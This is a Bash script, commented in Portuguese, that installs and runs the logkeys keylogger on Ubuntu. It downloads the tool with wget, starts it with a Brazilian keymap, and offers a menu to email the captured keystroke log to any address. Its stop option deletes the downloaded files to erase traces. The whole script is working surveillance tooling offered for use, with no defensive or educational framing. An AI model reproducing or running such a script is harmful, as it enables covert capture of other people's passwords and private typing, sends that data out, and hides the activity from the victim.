#!/bin/bash

#Script para baixar e executer um keylogger no ubuntu
#Luan Kleyton

data=`date +%d-%m-%y`

arquivo1='master.zip'
arquivo2='logkeys-master'
arquivo3='/usr/share/doc/unzip'
arquivo4='/etc/logkeys'

clear
echo "Iniciando o sistema"
sleep 3
echo ""
echo -e " -> Apagando pastas anteriores..."
sleep 3

if [ -e "$arquivo1" ] || [ -e "$arquivo2" ] ; then
	echo ""
	echo -e " -> Apagando $arquivo1"
#	rm master.zip
	sleep 3
	echo ""
	echo -e " -> Apagando pasta $arquivo2"
	rm -r logkeys-master
	sleep 3
else
	echo ""
	echo -e " -> Arquivos $arquivo1 e pasta $arquivo2 já foram apagados"
	sleep 3
fi

echo ""
echo -e " -> Iniciando Downloads necessarios"

sleep 3
if [ -e "$arquivo3" ] || [ -d "$arquivo4" ]; then
	echo ""
	echo -e " -> Unzip não encontrado"
	echo -e " -> Baixando..."
	apt-get install unzip -y
	sleep 3
	echo ""
	echo -e " -> Logkeys não encontrado"
	echo -e " -> Baixando"
        apt-get install logkeys -y
	sleep 3
else
	sleep 3
	echo ""
	echo -e " -> Unzip e Logkeys já baixandos"
	echo ""
	sleep 3
fi

if  [ -e "$arquivo1" ]; then
	echo ""
	echo -e " -> Arquivo $arquivo1 já existe"
	sleep 3
else
	echo ""
	echo -e " -> Baixando $arquivo1"
	sleep 3
	echo ""
	wget https://github.com/kernc/logkeys/archive/master.zip

fi
sleep 3
echo ""
echo -e " -> ok"
sleep 3
echo ""
echo -e " -> Descompactando..."
sleep 3

unzip -v master.zip
unzip master.zip
cd logkeys-master
echo -e ""
echo -e " -> Feito!"
sleep 3
clear

echo ""
echo -e " -> Iniciando logkeys [ENTER]"

log="/var/log/logkeys.log"
script2='chama-tail.sh'

while :
do
echo ""
echo -e "======================MENU======================"
echo "------------------------------------------------"
echo -e "Como prosseguir?" 
echo -e "\n[0] Iniciar o keylogger sem tela de log"
echo -e "\n[1] Abrir janela do logkeys iniciando o sistema"
echo -e "\n[2] Enviar log por e-mail"
echo -e "\n[3] Parar a execução do sistema"
echo "------------------------------------------------"
echo -e "" 
read resposta
case "$resposta" in
	0|"")
        echo -e "Opção $resposta -> Iniciando o keylogger nesta máquina"
	logkeys -s -m keymaps/pt_BR.map
	sleep 3
	echo ""
	echo -e " -> Iniciado!" 
	sleep 3
	clear
	;;
	1)
        echo -e "Opção $resposta -> Abrindo uma nova janela e iniciando o sistema"
	echo ""
	cd ..
        readonly script2="chama-tail.sh";
        chmod +x $script2;
        gnome-terminal -x bash -c "./$script2; exec $SHELL";
	sleep 1
	cd logkeys-master
	logkeys -s -m keymaps/pt_BR.map
        notify-send "Verificar a janela de logs do logkeys!"
	sleep 3
	clear
	;;
	2)
        echo -e "Opção $resposta -> Qual e-mail devo enviar os logs?"
	read email
	echo ""
	echo -e "Enviando logs para: $email"
	cat "$log" | mail -s "Logs capturados pelo logkeys" $email
	sleep 3
	echo ""
	echo -e "Enviado! Prosseguindo..."
	echo ""
	sleep 3
	clear
    	;;
    	3)
        echo -e "Opção $resposta -> Parar o sistema? [ENTER]"
	sleep 3
	logkeys -k
	echo ""
	echo " -> Apagando rastros"
	sleep 3
	cd ..
	if [ -e "$arquivo1" ] || [ -e "$arquivo2" ] ; then
		echo ""	
		echo -e " -> Apagando $arquivo1"
		rm master.zip
		sleep 3
		echo ""
		echo -e " -> Apagando pasta $arquivo2"
		rm -r logkeys-master 
		sleep 3
	else
		echo ""
		echo -e " -> Arquivos $arquivo1 e pasta $arquivo2 já foram apagados"
		sleep 3
	fi
	echo ""
	echo -e " -> Sistema finalizado!"
        exit
    	;;
    	*)
	echo ""
        echo " -> Opção $resposta -> Opção inválida"
	sleep 3
	clear	
 ;;
esac
done

echo ""
echo -e " -> Parar o sistema? [ENTER]"
read
logkeys -k
sleep 3
echo ""
echo " -> Ok "
sleep 3
echo ""
echo -e " -> Apagando rastros"
sleep 3
cd ..
if [ -e "$arquivo1" ] || [ -e "$arquivo2" ] ; then
	echo ""	
	echo -e " -> Apagando $arquivo1"
	rm master.zip
	sleep 3
	echo ""
	echo -e " -> Apagando pasta $arquivo2"
	rm -r logkeys-master 
	sleep 3
else
	echo ""
	echo -e " -> Arquivos $arquivo1 e pasta $arquivo2 já foram apagados"
	sleep 3
fi
echo ""
echo -e " -> Sistema finalizado!"
exit
